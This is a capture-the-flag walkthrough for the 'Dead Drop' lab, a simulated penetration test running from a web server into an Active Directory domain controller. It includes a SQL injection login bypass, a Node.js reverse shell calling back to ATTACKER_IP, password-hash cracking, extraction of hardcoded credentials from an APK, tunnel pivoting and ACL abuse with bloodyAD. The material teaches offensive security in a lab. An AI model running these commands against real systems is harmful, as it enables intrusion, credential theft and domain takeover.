# [Dead Drop](https://tryhackme.com/room/dead-drop)

## Every dead drop points inward. Chain your findings, pivot through the gaps, and follow the trail until nothing is out of reach.

# Introduction

You have been engaged as a penetration tester for a security audit of **DeadDrop Ltd**, a document management company that provides file-sharing services to corporate clients. The company recently expanded its infrastructure and wants assurance that its systems are secure before onboarding a major new client.

Your point of entry is a web-facing file-sharing application. Behind it sits an internal corporate network that you have no direct access to. Your objective is clear: compromise the domain controller and retrieve the flag from the Administrator's desktop. How you get there is up to you.

## Scope and Rules of Engagement

The engagement covers the following systems:

| Machine          | Role                            | Access                                                   |
| :--------------- | :------------------------------ | :------------------------------------------------------- |
| DeadDrop-WEB     | DMZ web server                  | Directly accessible via your VPN connection              |
| Internal network | Corporate LAN (192.168.11.0/24) | Not directly accessible, must be reached through the DMZ |

The internal network contains a Windows workstation and a domain controller, but you will need to discover their exact addresses yourself.

**In scope:**

- All services running on the target machines
- Any credentials or hashes you discover along the way
- Pivoting from the DMZ into the internal network
- Active Directory enumeration and ACL-based attacks

**Out of scope:**

- Denial of service attacks
- Social engineering of DeadDrop Ltd employees
- Modifying or deleting data on production systems

# Dead Drop

DeadDrop Ltd's file-sharing application is your starting point. Everything you need to reach the domain controller can be discovered through careful enumeration and exploitation. Each question below marks a milestone in the attack chain.

### What password grants you SSH access to the web server?

1. Scan the web server

Start with a full TCP port scan against `DeadDrop-WEB` to get a complete picture of the attack surface:

```bash
nmap -p- -sVC 192.168.11.200
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 cb:b6:02:7d:6e:d6:d2:42:8c:de:a2:04:ff:01:63:58 (ECDSA)
|_  256 bf:85:b8:66:fe:7c:7a:b3:5e:bb:ee:fd:69:50:5f:71 (ED25519)
80/tcp open  http    Node.js Express framework
| http-title: DeadDrop - Login
|_Requested resource was /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports are open: SSH and a Node.js/Express web application whose landing page redirects unauthenticated visitors to `/login`.

2. Bypass authentication on the login page

Browsing to `http://192.168.11.200/login` presents a standard username/password form. Since the backend is an Express app, it's worth testing whether the login query is built with unsanitized string concatenation against a SQL backend. Submitting the following as the username field, with any value in the password field, authenticates as the first user in the table without knowing a real password: `admin' AND 1=1 -- -`.

This closes out the intended string comparison and appends a tautology, then comments out the rest of the original query with `-- -`, so the query effectively becomes "return the row where the username starts with `admin`," bypassing the password check entirely. This drops us into `http://192.168.11.200/dashboard` as an authenticated user.

3. Identify and abuse the file upload feature

The dashboard exposes a file-sharing/upload feature. Testing shows uploaded files are stored server-side and can be rendered back via a `/preview/<filename>` endpoint. Critically, `.js` files are accepted and are later `require()`'d or executed by the Node.js backend when previewed, rather than being served as static content. Upload a small reverse shell payload as `shell.js`:

```javascript
require("child_process").exec(
  'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"',
);
```

4. Start a listener

Before triggering the payload, start a netcat listener on the attacking machine to catch the callback:

```bash
nc -lvnp 4444
```

5. Trigger the payload

Request the uploaded file's preview endpoint to force the server to execute it: `http://192.168.11.200/preview/shell.js`.

The listener catches an interactive shell as the low-privileged user the Node.js process runs as.

6. Loot the application database

Once in, hunt for the application's data files. The Express app's SQLite database is found and dumped:

```bash
cat deaddrop.db
```

**Results:**

```
tableusersusersCREATE TABLE users (_sequenceCREATE TABLE sqlite_sequence(name,seq)��
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL
���!+svc-backupBackupAgent2024▒/adminSuperSecretAdm1n!
���!svc-users
```

The binary SQLite file reveals the same application-level accounts. None of these directly map to a valid Linux system account, but they hint at naming conventions used elsewhere on the host.

7. Locate and read a shadow backup file

Further enumeration of the filesystem turns up a leftover shadow file backup:

```bash
cat shadow.bak
```

**Results:**

```
svc-drop:$6$f1331af25300c7f3$7twueSf8eUyvgYnPWElPYpspGgBuYJ.TMGrPZ2OBC6pGq18ZGkkPke9S0tRlQ3EpiRLWEqhgnqkh2BOHfdCCH0:19700:0:99999:7:::
```

The `$6$` prefix identifies this as a `sha512crypt` hash. The format `glibc` uses for `/etc/shadow` entries. The account is `svc-drop`, a Linux system account distinct from the application-level accounts found in the SQLite database.

8. Crack the hash offline

Copy the hash to the attacking machine and crack it with John the Ripper against `rockyou.txt`:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<img width="724" height="188" alt="SCREEN01" src="https://github.com/user-attachments/assets/f22c74fc-4cf8-4297-bf60-8fd023ee3e06" />

9. Confirm SSH access

```bash
ssh svc-drop@192.168.11.200
```

---

### What credentials does the company's internal mobile application contain? (Format: `username:password`)

With SSH access as `svc-drop`, look around the home directory and any backup folders the account has access to. This is a natural place for developers/ops to have stashed release artifacts.

1. Pull down the mobile app package

```bash
scp svc-drop@192.168.11.200:backup/deaddrop-mobile.apk .
```

2. Decompile the APK

Android apps are distributed as `.apk` files, which are ZIP archives containing compiled DEX bytecode, resources, and a manifest. `apktool` disassembles the DEX bytecode into readable Smali and, importantly, extracts the resource XML in a human-readable form including string resources, which is where hardcoded secrets often end up:

```bash
apktool d deaddrop-mobile.apk -o deaddrop-decompiled
```

3. Search the extracted resources for hardcoded credentials

```bash
cat deaddrop-decompiled/res/values/strings.xml
```

**Results:**

```
<string name="default_password">DropsOfJupiter2026!</string>
<string name="default_username">j.harris</string>
```

The developers hardcoded a default account used by the mobile client to authenticate against internal services. Based on the username format, almost certainly a domain account rather than another local Linux user.

---

### What Active Directory permission does your domain account hold that can be abused for privilege escalation?

The credentials recovered from the APK look like an Active Directory account, but the internal network isn't directly reachable from the attacking machine. Only the DMZ web server is. To reach it, pivot through `DeadDrop-WEB` using a Ligolo-ng tunnel.

1. Start the Ligolo-ng proxy on the attacking machine

```bash
ligolo-proxy -selfcert
```

This starts the Ligolo-ng control server, listening for an agent to connect back and generating a self-signed certificate since we don't have a trusted one for this internal engagement.

2. Deploy and run the agent on the compromised web server

Copy the matching Ligolo-ng agent binary to the web server over the already-established SSH access, make it executable, and run it, pointing back at the proxy listener:

```bash
scp /usr/share/ligolo-ng-common-binaries/ligolo-ng_agent_0.9_linux_amd64 svc-drop@192.168.11.200:/tmp/agent
ssh svc-drop@192.168.11.200
cd /tmp
chmod +x agent
./agent -connect 192.168.21.14:11601 -ignore-cert
```

`-ignore-cert` is required here because the proxy is using the self-signed certificate generated in step 1.

3. Set up the tunnel interface and routes on the proxy side

Back on the attacking machine, inside the Ligolo-ng proxy console:

```bash
ifcreate --name dead-drop
route_add --name dead-drop --route 192.168.11.51/32
route_add --name dead-drop --route 192.168.11.100/32
session
1
tunnel_start --tun dead-drop
```

`ifcreate` creates a local virtual network interface to represent the pivot. `route_add` scopes specific internal hosts to route through that interface. `session` followed by `1` selects the first connected agent session, and `tunnel_start` binds the tunnel to the interface, making the routed hosts reachable as if we were on the internal LAN.

4. Bring the interface up locally

```bash
ip link set dead-drop up
ip route add 192.168.11.0/24 dev dead-drop metric 50
```

Adding the full `/24` as a route lets local tools resolve and target the subnet naturally; traffic to the two hosts routed through Ligolo-ng reaches them, while anything else on the subnet will simply time out until further routes are added on the proxy side.

5. Enumerate the domain controller

With the tunnel live, scan the discovered internal host:

```bash
nmap -p- -sVC 192.168.11.100
```

**Results:**

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-02 17:58:58Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: deaddrop.loc, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: deaddrop.loc, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: DEADDROP
|   NetBIOS_Domain_Name: DEADDROP
|   NetBIOS_Computer_Name: DEADDROP-DC
|   DNS_Domain_Name: deaddrop.loc
|   DNS_Computer_Name: DEADDROP-DC.deaddrop.loc
|   DNS_Tree_Name: deaddrop.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-02T17:59:49+00:00
| ssl-cert: Subject: commonName=DEADDROP-DC.deaddrop.loc
| Not valid before: 2026-05-10T06:08:15
|_Not valid after:  2026-11-09T06:08:15
|_ssl-date: 2026-08-02T18:00:29+00:00; -1s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49678/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49773/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DEADDROP-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-08-02T17:59:49
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
|_nbstat: NetBIOS name: DEADDROP-DC, NetBIOS user: <unknown>, NetBIOS MAC: 06:44:ea:ba:e9:3b (unknown)
```

This confirms the box is a Windows Server 2019-based Domain Controller for the domain `deaddrop.loc`, with LDAP, Kerberos, SMB, RDP, and WinRM all exposed. Plenty of avenues once we have valid credentials, which we do.

6. Add the DC to `/etc/hosts` and run BloodHound

Kerberos and LDAP are picky about name resolution, so map the DC's hostname locally:

```bash
echo "192.168.11.100 deaddrop.loc DEADDROP-DC.deaddrop.loc DEADDROP-DC" >> /etc/hosts
```

Then collect Active Directory data with BloodHound's Python collector, authenticating as `j.harris`:

```bash
bloodhound-ce.py -u 'j.harris' -p 'DropsOfJupiter2026!' -d deaddrop.loc -dc DEADDROP-DC.deaddrop.loc -ns 192.168.11.100 -c All --zip
```

7. Analyze the collected data

Importing the resulting zip into BloodHound CE and marking `J.HARRIS@DEADDROP.LOC` as the starting node, the "Outbound Object Control" panel shows a direct edge from `j.harris` onto a group object: an `AddMember` ACE. This grants `j.harris` the right to add arbitrary principals including himself as a member of that group, without needing to know the group's current membership or having any other privilege.

**Answer:** `AddMember`

---

### What is the name of the group you target to escalate to Domain Admin?

Following the `AddMember` edge in BloodHound identifies the target group as `ITSupport-Admins`. Checking that group's own outbound control and group memberships shows it holds privileges sufficient to reach an effectively Domain Admin-equivalent foothold on `DEADDROP-DC`. Since we already hold `AddMember` on it via `j.harris`, the abuse path is straightforward: add `j.harris` to the group and inherit its privileges.

1. Add the account using `bloodyAD`, a tool purpose-built for performing AD object/attribute writes over LDAP:

```bash
bloodyAD --host DEADDROP-DC.deaddrop.loc -d deaddrop.loc -u j.harris -p 'DropsOfJupiter2026!' add groupMember 'ITSupport-Admins' j.harris
```

**Answer:** `ITSupport-Admins`

---

### What is the flag on the Domain Controller?

1. Authenticate to the DC with the newly privileged account

Since group membership changes require a fresh Kerberos ticket/logon session to be reflected in the token, authenticate fresh rather than reusing any cached session. With WinRM open, `evil-winrm` gives us an interactive PowerShell session:

```bash
evil-winrm -i 192.168.11.100 -u 'j.harris' -p 'DropsOfJupiter2026!'
```

Membership in `ITSupport-Admins` is what grants `j.harris` sufficient rights on `DEADDROP-DC` to open this session and to read the Administrator's files.

2. Retrieve the flag

```bash
type C:\Users\Administrator\Desktop\flag.txt
```

<img width="718" height="526" alt="SCREEN02" src="https://github.com/user-attachments/assets/33e1b94a-f593-49a0-a689-b423cba9b041" />
